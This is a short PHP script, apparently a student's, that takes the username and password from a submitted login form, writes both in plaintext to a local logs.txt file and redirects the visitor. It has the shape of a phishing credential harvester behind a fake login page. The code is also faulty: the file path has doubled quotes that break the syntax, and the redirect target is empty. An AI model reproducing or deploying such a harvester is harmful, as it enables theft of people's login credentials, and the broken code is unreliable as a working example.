<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $file = fopen(""C:\Users\Students Account\Documents\NetBeansProjects\logs.txt"", "a");
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fwrite($file, "--------------------\n");
    fclose($file);

    header("Location:");
    exit();
}
?>
